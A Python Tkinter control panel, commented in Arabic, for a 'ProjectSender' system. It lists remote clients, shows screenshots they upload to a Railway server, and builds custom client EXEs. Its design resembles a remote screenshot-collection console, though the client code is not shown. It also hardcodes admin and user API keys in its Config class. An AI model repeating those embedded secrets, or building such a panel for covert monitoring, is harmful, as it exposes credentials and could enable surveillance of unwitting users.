#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
ProjectSender Panel v4 - Railway Edition
لوحة تحكم متقدمة مع قسم إنشاء EXE مخصص
"""

import tkinter as tk
from tkinter import ttk, messagebox, filedialog
import requests
import threading
import json
import os
import subprocess
import sys
from datetime import datetime
from PIL import Image, ImageTk
from io import BytesIO
import base64
from pathlib import Path

# ==================== التكوين ====================

class Config:
    # Railway Server
    SERVER_URL = "https://web-production-80fa0.up.railway.app"
    ADMIN_API_KEY = "skpro_admin_xK9mP3qR7vN2bL8wY5jH4dF6gT1cZeR"
    USER_API_KEY = "skpro_user_aB7cD2eF5gH8iJ3kL6mN9oP4qR1sT5uV"
    
    CONFIG_FILE = "panel_config.json"
    
    @staticmethod
    def load():
        if os.path.exists(Config.CONFIG_FILE):
            try:
                with open(Config.CONFIG_FILE, "r", encoding="utf-8") as f:
                    data = json.load(f)
                    Config.SERVER_URL = data.get("server_url", Config.SERVER_URL)
                    Config.ADMIN_API_KEY = data.get("admin_key", Config.ADMIN_API_KEY)
                    Config.USER_API_KEY = data.get("user_key", Config.USER_API_KEY)
            except:
                pass
    
    @staticmethod
    def save():
        with open(Config.CONFIG_FILE, "w", encoding="utf-8") as f:
            json.dump({
                "server_url": Config.SERVER_URL,
                "admin_key": Config.ADMIN_API_KEY,
                "user_key": Config.USER_API_KEY
            }, f, indent=2)

# ==================== الواجهة الرسومية ====================

class ScreenshotPanel:
    def __init__(self, root):
        self.root = root
        self.root.title("ProjectSender Panel v4 - Railway Edition")
        self.root.geometry("1500x900")
        self.root.configure(bg="#1e1e1e")
        
        # تحميل الإعدادات
        Config.load()
        
        # متغيرات
        self.clients = {}
        self.selected_client = None
        self.screenshots = []
        self.refresh_thread = None
        self.is_running = True
        self.pages_entries = []  # لتخزين حقول الأسماء والكميات
        
        # إنشاء الواجهة
        self.create_ui()
        
        # بدء التحديث التلقائي
        self.start_auto_refresh()
    
    def create_ui(self):
        """إنشاء الواجهة الرسومية"""
        
        # ==================== القائمة العلوية ====================
        
        top_frame = tk.Frame(self.root, bg="#2d2d2d", height=70)
        top_frame.pack(fill=tk.X, padx=10, pady=10)
        
        # العنوان
        title_label = tk.Label(
            top_frame,
            text="🔷 ProjectSender Panel v4 - Railway Edition",
            font=("Arial", 16, "bold"),
            bg="#2d2d2d",
            fg="#00ff88"
        )
        title_label.pack(side=tk.LEFT, padx=10, pady=5)
        
        # حالة الاتصال
        self.status_label = tk.Label(
            top_frame,
            text="🔴 غير متصل",
            font=("Arial", 11, "bold"),
            bg="#2d2d2d",
            fg="#ff0000"
        )
        self.status_label.pack(side=tk.LEFT, padx=20, pady=5)
        
        # الإعدادات
        settings_frame = tk.Frame(top_frame, bg="#2d2d2d")
        settings_frame.pack(side=tk.RIGHT, padx=10, pady=5)
        
        tk.Label(settings_frame, text="Server URL:", bg="#2d2d2d", fg="#ffffff").pack(side=tk.LEFT, padx=5)
        self.server_url_entry = tk.Entry(settings_frame, width=30)
        self.server_url_entry.pack(side=tk.LEFT, padx=5)
        self.server_url_entry.insert(0, Config.SERVER_URL)
        
        tk.Label(settings_frame, text="Admin Key:", bg="#2d2d2d", fg="#ffffff").pack(side=tk.LEFT, padx=5)
        self.admin_key_entry = tk.Entry(settings_frame, width=20, show="*")
        self.admin_key_entry.pack(side=tk.LEFT, padx=5)
        self.admin_key_entry.insert(0, Config.ADMIN_API_KEY)
        
        tk.Label(settings_frame, text="User Key:", bg="#2d2d2d", fg="#ffffff").pack(side=tk.LEFT, padx=5)
        self.user_key_entry = tk.Entry(settings_frame, width=20, show="*")
        self.user_key_entry.pack(side=tk.LEFT, padx=5)
        self.user_key_entry.insert(0, Config.USER_API_KEY)
        
        save_btn = tk.Button(
            settings_frame,
            text="💾 Save Settings",
            bg="#0066cc",
            fg="white",
            command=self.save_settings,
            padx=10
        )
        save_btn.pack(side=tk.LEFT, padx=5)
        
        test_btn = tk.Button(
            settings_frame,
            text="🧪 Test Connection",
            bg="#00aa00",
            fg="white",
            command=self.test_connection,
            padx=10
        )
        test_btn.pack(side=tk.LEFT, padx=5)
        
        upload_btn = tk.Button(
            settings_frame,
            text="📤 Upload to GitHub",
            bg="#ff6600",
            fg="white",
            command=self.show_github_commands,
            padx=10
        )
        upload_btn.pack(side=tk.LEFT, padx=5)
        
        # ==================== التبويبات ====================
        
        self.notebook = ttk.Notebook(self.root)
        self.notebook.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        # تبويب العملاء
        self.clients_tab = tk.Frame(self.notebook, bg="#1e1e1e")
        self.notebook.add(self.clients_tab, text="👥 Clients")
        self.create_clients_tab()
        
        # تبويب إنشاء EXE
        self.exe_tab = tk.Frame(self.notebook, bg="#1e1e1e")
        self.notebook.add(self.exe_tab, text="🔨 Generate EXE")
        self.create_exe_tab()
    
    def create_clients_tab(self):
        """إنشاء تبويب العملاء"""
        
        main_frame = tk.Frame(self.clients_tab, bg="#1e1e1e")
        main_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        # قائمة العملاء
        left_frame = tk.Frame(main_frame, bg="#1e1e1e")
        left_frame.pack(side=tk.LEFT, fill=tk.BOTH, expand=False, padx=5)
        
        clients_label = tk.Label(
            left_frame,
            text="📋 العملاء",
            font=("Arial", 12, "bold"),
            bg="#1e1e1e",
            fg="#00ff88"
        )
        clients_label.pack(pady=5)
        
        # Listbox للعملاء
        self.clients_listbox = tk.Listbox(
            left_frame,
            bg="#2d2d2d",
            fg="#00ff88",
            width=25,
            height=20
        )
        self.clients_listbox.pack(fill=tk.BOTH, expand=True)
        self.clients_listbox.bind("<<ListboxSelect>>", self.on_client_select)
        
        # معلومات العميل
        right_frame = tk.Frame(main_frame, bg="#1e1e1e")
        right_frame.pack(side=tk.RIGHT, fill=tk.BOTH, expand=True, padx=5)
        
        info_label = tk.Label(
            right_frame,
            text="📊 معلومات العميل",
            font=("Arial", 12, "bold"),
            bg="#1e1e1e",
            fg="#00ff88"
        )
        info_label.pack(pady=5)
        
        self.info_text = tk.Text(
            right_frame,
            bg="#2d2d2d",
            fg="#00ff88",
            height=10,
            width=50
        )
        self.info_text.pack(fill=tk.BOTH, expand=True)
        
        # معرض الصور
        gallery_frame = tk.LabelFrame(
            right_frame,
            text="🖼️ معرض الصور",
            font=("Arial", 10, "bold"),
            bg="#2d2d2d",
            fg="#00ff88",
            padx=10,
            pady=10
        )
        gallery_frame.pack(fill=tk.BOTH, expand=True, pady=5)
        
        self.gallery_canvas = tk.Canvas(
            gallery_frame,
            bg="#1e1e1e",
            height=200
        )
        self.gallery_canvas.pack(fill=tk.BOTH, expand=True)
    
    def create_exe_tab(self):
        """إنشاء تبويب إنشاء EXE"""
        
        main_frame = tk.Frame(self.exe_tab, bg="#1e1e1e")
        main_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        # العنوان
        title = tk.Label(
            main_frame,
            text="🔨 إنشاء EXE مخصص للعملاء",
            font=("Arial", 14, "bold"),
            bg="#1e1e1e",
            fg="#00ff88"
        )
        title.pack(pady=10)
        
        # قسم الأسماء والكميات
        pages_frame = tk.LabelFrame(
            main_frame,
            text="📄 الصفحات والكميات",
            font=("Arial", 11, "bold"),
            bg="#2d2d2d",
            fg="#00ff88",
            padx=10,
            pady=10
        )
        pages_frame.pack(fill=tk.BOTH, expand=True, pady=10)
        
        # Canvas مع Scrollbar
        canvas = tk.Canvas(pages_frame, bg="#1e1e1e", highlightthickness=0)
        scrollbar = ttk.Scrollbar(pages_frame, orient="vertical", command=canvas.yview)
        scrollable_frame = tk.Frame(canvas, bg="#1e1e1e")
        
        scrollable_frame.bind(
            "<Configure>",
            lambda e: canvas.configure(scrollregion=canvas.bbox("all"))
        )
        
        canvas.create_window((0, 0), window=scrollable_frame, anchor="nw")
        canvas.configure(yscrollcommand=scrollbar.set)
        
        canvas.pack(side="left", fill="both", expand=True)
        scrollbar.pack(side="right", fill="y")
        
        # إضافة 5 صفوف افتراضية
        for i in range(5):
            row_frame = tk.Frame(scrollable_frame, bg="#2d2d2d")
            row_frame.pack(fill=tk.X, pady=5, padx=5)
            
            # حقل الاسم
            tk.Label(row_frame, text=f"Page {i+1}:", bg="#2d2d2d", fg="#ffffff", width=10).pack(side=tk.LEFT, padx=5)
            
            name_entry = tk.Entry(row_frame, width=20)
            name_entry.pack(side=tk.LEFT, padx=5)
            
            tk.Label(row_frame, text="Photos:", bg="#2d2d2d", fg="#ffffff").pack(side=tk.LEFT, padx=5)
            
            # حقل الكمية
            count_var = tk.StringVar(value="50")
            count_spin = tk.Spinbox(
                row_frame,
                from_=1,
                to=500,
                textvariable=count_var,
                width=10
            )
            count_spin.pack(side=tk.LEFT, padx=5)
            
            self.pages_entries.append({
                "name_entry": name_entry,
                "count_var": count_var
            })
        
        # أزرار التحكم
        buttons_frame = tk.Frame(main_frame, bg="#1e1e1e")
        buttons_frame.pack(fill=tk.X, pady=10)
        
        generate_btn = tk.Button(
            buttons_frame,
            text="🔨 Generate EXE",
            bg="#00aa00",
            fg="white",
            font=("Arial", 12, "bold"),
            command=self.generate_exe,
            padx=20,
            pady=10
        )
        generate_btn.pack(side=tk.LEFT, padx=5)
        
        # زر Generate & Save EXE Auto
        auto_build_btn = tk.Button(
            buttons_frame,
            text="⚡ Generate & Save EXE Auto",
            bg="#ff6600",
            fg="white",
            font=("Arial", 12, "bold"),
            command=self.generate_and_save_exe_auto,
            padx=20,
            pady=10
        )
        auto_build_btn.pack(side=tk.LEFT, padx=5)
        
        # حالة الإنشاء
        self.exe_status_label = tk.Label(
            main_frame,
            text="",
            font=("Arial", 10),
            bg="#1e1e1e",
            fg="#00ff88"
        )
        self.exe_status_label.pack(pady=10)
    
    def save_settings(self):
        """حفظ الإعدادات"""
        Config.SERVER_URL = self.server_url_entry.get()
        Config.ADMIN_API_KEY = self.admin_key_entry.get()
        Config.USER_API_KEY = self.user_key_entry.get()
        Config.save()
        messagebox.showinfo("Success", "Settings saved!")
    
    def test_connection(self):
        """اختبار الاتصال"""
        try:
            response = requests.get(
                f"{Config.SERVER_URL}/health",
                timeout=5
            )
            if response.status_code == 200:
                self.status_label.config(text="🟢 متصل", fg="#00ff00")
                messagebox.showinfo("Success", "Connected!")
                self.refresh_clients()
            else:
                self.status_label.config(text="🔴 غير متصل", fg="#ff0000")
                messagebox.showerror("Error", "Server error!")
        except Exception as e:
            self.status_label.config(text="🔴 غير متصل", fg="#ff0000")
            messagebox.showerror("Error", f"Connection failed: {str(e)}")
    
    def refresh_clients(self):
        """تحديث قائمة العملاء"""
        try:
            headers = {"X-API-Key": Config.ADMIN_API_KEY}
            response = requests.get(
                f"{Config.SERVER_URL}/api/clients",
                headers=headers,
                timeout=5
            )
            
            if response.status_code == 200:
                self.clients = response.json().get("clients", {})
                self.clients_listbox.delete(0, tk.END)
                
                for client_id, client_info in self.clients.items():
                    status = "🟢" if client_info.get("status") == "online" else "🔴"
                    display_name = client_info.get("display_name", "N/A")
                    self.clients_listbox.insert(tk.END, f"{status} {display_name} ({client_id[:8]})")
        except:
            pass
    
    def on_client_select(self, event):
        """عند اختيار عميل"""
        selection = self.clients_listbox.curselection()
        if not selection:
            return
        
        index = selection[0]
        client_ids = list(self.clients.keys())
        
        if index < len(client_ids):
            self.selected_client = client_ids[index]
            client_info = self.clients[self.selected_client]
            
            info_text = f"""
Client ID: {self.selected_client}
Computer: {client_info.get('computer', 'N/A')}
Status: {client_info.get('status', 'N/A')}
Display Name: {client_info.get('display_name', 'N/A')}
Photo Count: {client_info.get('photo_count', 0)}
Delay: {client_info.get('delay', 'N/A')}s
Screenshots: {len(client_info.get('screenshots', []))}
Last Seen: {client_info.get('last_seen', 'N/A')}
            """
            
            self.info_text.delete(1.0, tk.END)
            self.info_text.insert(1.0, info_text)
            
            # تحميل الصور
            self.load_screenshots()
    
    def extract_display_name(self, url):
        """استخراج أول مسار من URL"""
        try:
            from urllib.parse import urlparse
            import re
            
            parsed = urlparse(url)
            path = parsed.path.strip("/")
            
            if not path:
                return "site"
            
            segments = path.split("/")
            first_segment = segments[0]
            
            first_segment = re.sub(r'[^a-zA-Z0-9_-]', '_', first_segment)
            
            if not first_segment:
                return "site"
            
            return first_segment
        except:
            return "N/A"
    
    def load_screenshots(self):
        """تحميل الصور من الخادم"""
        if not self.selected_client:
            return
        
        try:
            headers = {"X-API-Key": Config.ADMIN_API_KEY}
            response = requests.get(
                f"{Config.SERVER_URL}/api/screenshots/{self.selected_client}",
                headers=headers,
                timeout=5
            )
            
            if response.status_code == 200:
                self.screenshots = response.json().get("screenshots", [])
                self.display_gallery()
        except Exception as e:
            pass
    
    def display_gallery(self):
        """عرض معرض الصور"""
        self.gallery_canvas.delete("all")
        
        if not self.screenshots:
            self.gallery_canvas.create_text(
                self.gallery_canvas.winfo_width() // 2,
                self.gallery_canvas.winfo_height() // 2,
                text="No screenshots available",
                fill="#00ff88",
                font=("Arial", 12)
            )
            return
        
        x = 10
        for screenshot in self.screenshots[:10]:
            try:
                image_data = base64.b64decode(screenshot["image"])
                image = Image.open(BytesIO(image_data))
                image.thumbnail((150, 150))
                photo = ImageTk.PhotoImage(image)
                
                self.gallery_canvas.create_image(x, 10, image=photo, anchor="nw")
                self.gallery_canvas.image = photo
                
                x += 160
            except:
                pass
    
    def generate_exe(self):
        """إنشاء EXE"""
        try:
            # جمع البيانات من الحقول
            pages = []
            for entry in self.pages_entries:
                name = entry["name_entry"].get().strip()
                count = entry["count_var"].get()
                
                if name:
                    pages.append({
                        "name": name,
                        "photo_count": int(count)
                    })
            
            if not pages:
                messagebox.showerror("Error", "Please enter at least one page!")
                return
            
            # إرسال طلب الإنشاء
            headers = {"X-API-Key": Config.ADMIN_API_KEY}
            data = {
                "pages": pages,
                "exe_name": "ProjectSender_Client"
            }
            
            response = requests.post(
                f"{Config.SERVER_URL}/api/generate_exe",
                json=data,
                headers=headers,
                timeout=10
            )
            
            if response.status_code == 200:
                result = response.json()
                exe_id = result.get("exe_id")
                
                self.exe_status_label.config(
                    text=f"✅ EXE Created! ID: {exe_id}",
                    fg="#00ff00"
                )
                
                messagebox.showinfo(
                    "Success",
                    f"EXE created successfully!\n\nEXE ID: {exe_id}\n\nGive this ID to your client."
                )
            else:
                messagebox.showerror("Error", f"Failed to create EXE: {response.text}")
        except Exception as e:
            messagebox.showerror("Error", f"Error: {str(e)}")
    
    def generate_and_save_exe_auto(self):
        """إنشاء وحفظ EXE تلقائياً"""
        try:
            # جمع البيانات من الحقول
            pages = []
            for entry in self.pages_entries:
                name = entry["name_entry"].get().strip()
                count = entry["count_var"].get()
                
                if name:
                    pages.append({
                        "name": name,
                        "photo_count": int(count)
                    })
            
            if not pages:
                messagebox.showerror("Error", "Please enter at least one page!")
                return
            
            # الخطوة 1: إنشاء EXE ID
            self.exe_status_label.config(
                text="⏳ Creating EXE configuration...",
                fg="#ffff00"
            )
            self.root.update()
            
            headers = {"X-API-Key": Config.ADMIN_API_KEY}
            data = {
                "pages": pages,
                "exe_name": "ProjectSender_Client"
            }
            
            response = requests.post(
                f"{Config.SERVER_URL}/api/generate_exe",
                json=data,
                headers=headers,
                timeout=10
            )
            
            if response.status_code != 200:
                messagebox.showerror("Error", f"Failed to create EXE: {response.text}")
                return
            
            result = response.json()
            exe_id = result.get("exe_id")
            
            # الخطوة 2: اختيار مكان الحفظ
            self.exe_status_label.config(
                text="⏳ Selecting save location...",
                fg="#ffff00"
            )
            self.root.update()
            
            file_path = filedialog.asksaveasfilename(
                defaultextension=".exe",
                filetypes=[("Executable files", "*.exe"), ("All files", "*.*")],
                initialfile=f"ProjectSender_Client_{exe_id[:8]}.exe"
            )
            
            if not file_path:
                messagebox.showwarning("Cancelled", "Save cancelled!")
                return
            
            # الخطوة 3: بناء EXE
            self.exe_status_label.config(
                text="⏳ Building EXE... This may take a minute...",
                fg="#ffff00"
            )
            self.root.update()
            
            # استدعاء build_exe_from_config.py
            try:
                # البحث عن build_exe_from_config.py
                script_path = Path(__file__).parent / "build_exe_from_config.py"
                if not script_path.exists():
                    script_path = Path("build_exe_from_config.py")
                
                if not script_path.exists():
                    messagebox.showerror("Error", "build_exe_from_config.py not found!")
                    return
                
                # تشغيل البناء
                result = subprocess.run(
                    [sys.executable, str(script_path), exe_id, file_path],
                    capture_output=True,
                    text=True,
                    timeout=300
                )
                
                if result.returncode != 0:
                    messagebox.showerror("Build Error", f"Build failed:\n{result.stderr}")
                    return
                
                # النجاح
                self.exe_status_label.config(
                    text=f"✅ EXE Saved! ID: {exe_id}",
                    fg="#00ff00"
                )
                
                messagebox.showinfo(
                    "Success",
                    f"EXE created and saved successfully!\n\n"
                    f"File: {file_path}\n\n"
                    f"EXE ID: {exe_id}\n\n"
                    f"You can now give this EXE to your client."
                )
            except subprocess.TimeoutExpired:
                messagebox.showerror("Error", "Build process timed out!")
            except Exception as e:
                messagebox.showerror("Error", f"Build error: {str(e)}")
        
        except Exception as e:
            messagebox.showerror("Error", f"Error: {str(e)}")
    
    def start_auto_refresh(self):
        """بدء التحديث التلقائي"""
        def refresh_loop():
            while self.is_running:
                self.refresh_clients()
                threading.Event().wait(5)
        
        self.refresh_thread = threading.Thread(target=refresh_loop, daemon=True)
        self.refresh_thread.start()
    
    def show_github_commands(self):
        """عرض أوامر git لرفع الملفات إلى GitHub"""
        
        commands = """# أوامر رفع الملفات إلى GitHub

## الخطوة 1: الذهاب إلى مجلد المشروع
```bash
cd /path/to/your/repo
```

## الخطوة 2: نسخ الملفات الجديدة
```bash
cp main_backend_v3.py .
cp panel_v4_railway.py .
cp screenshot_client_v2_gui.py .
cp build_exe_from_config.py .
cp screenshot_client_auto.py .
cp requirements.txt .
cp railway.json .
cp Dockerfile .
```

## الخطوة 3: إضافة الملفات
```bash
git add .
```

## الخطوة 4: Commit
```bash
git commit -m "Update: Add v6 features - Generate EXE functionality"
```

## الخطوة 5: Push
```bash
git push origin main
```

## الخطوة 6 (اختياري): حذف الملفات القديمة
```bash
git rm main_backend_v2.py
git rm panel_v3_railway.py
git rm screenshot_client_auto_monitor.py
git rm build_exe_complete.py

git commit -m "Remove: Delete old v5 files"
git push origin main
```
"""
        
        # إنشاء نافذة جديدة
        commands_window = tk.Toplevel(self.root)
        commands_window.title("GitHub Upload Commands")
        commands_window.geometry("600x500")
        commands_window.configure(bg="#1e1e1e")
        
        # عنوان
        title = tk.Label(
            commands_window,
            text="📤 أوامر رفع الملفات إلى GitHub",
            font=("Arial", 12, "bold"),
            bg="#1e1e1e",
            fg="#00ff88"
        )
        title.pack(pady=10)
        
        # نص الأوامر
        text_widget = tk.Text(
            commands_window,
            bg="#2d2d2d",
            fg="#00ff88",
            font=("Courier", 10),
            height=20,
            width=70
        )
        text_widget.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        text_widget.insert(1.0, commands)
        text_widget.config(state=tk.DISABLED)
        
        # أزرار
        buttons_frame = tk.Frame(commands_window, bg="#1e1e1e")
        buttons_frame.pack(fill=tk.X, padx=10, pady=10)
        
        copy_btn = tk.Button(
            buttons_frame,
            text="📋 Copy All Commands",
            bg="#0066cc",
            fg="white",
            command=lambda: self.copy_to_clipboard(commands)
        )
        copy_btn.pack(side=tk.LEFT, padx=5)
        
        download_btn = tk.Button(
            buttons_frame,
            text="📥 Download ZIP",
            bg="#ff6600",
            fg="white",
            command=self.download_zip
        )
        download_btn.pack(side=tk.LEFT, padx=5)
        
        close_btn = tk.Button(
            buttons_frame,
            text="✖ Close",
            bg="#cc0000",
            fg="white",
            command=commands_window.destroy
        )
        close_btn.pack(side=tk.RIGHT, padx=5)
    
    def copy_to_clipboard(self, text):
        """نسخ النص إلى الحافظة"""
        self.root.clipboard_clear()
        self.root.clipboard_append(text)
        messagebox.showinfo("Success", "Commands copied to clipboard!")
    
    def download_zip(self):
        """تحميل ملف ZIP"""
        try:
            file_path = filedialog.asksaveasfilename(
                defaultextension=".zip",
                filetypes=[("ZIP files", "*.zip"), ("All files", "*.*")],
                initialfile="ProjectSender_v6_Clean.zip"
            )
            
            if not file_path:
                return
            
            # البحث عن ملف ZIP
            source_zip = None
            
            # البحث في الأماكن المختلفة
            possible_paths = [
                Path(__file__).parent / "ProjectSender_v6_Clean.zip",
                Path("ProjectSender_v6_Clean.zip"),
                Path.home() / "ProjectSender_v6_Clean.zip",
                Path.home() / "Downloads" / "ProjectSender_v6_Clean.zip",
            ]
            
            for path in possible_paths:
                if path.exists():
                    source_zip = path
                    break
            
            if not source_zip:
                messagebox.showerror("Error", "ZIP file not found!")
                return
            
            # نسخ الملف
            import shutil
            shutil.copy(str(source_zip), file_path)
            
            messagebox.showinfo("Success", f"ZIP file saved to:\n{file_path}")
        except Exception as e:
            messagebox.showerror("Error", f"Error: {str(e)}")
    
    def on_closing(self):
        """عند إغلاق النافذة"""
        self.is_running = False
        self.root.destroy()

# ==================== البرنامج الرئيسي ====================

if __name__ == "__main__":
    root = tk.Tk()
    app = ScreenshotPanel(root)
    root.protocol("WM_DELETE_WINDOW", app.on_closing)
    root.mainloop()
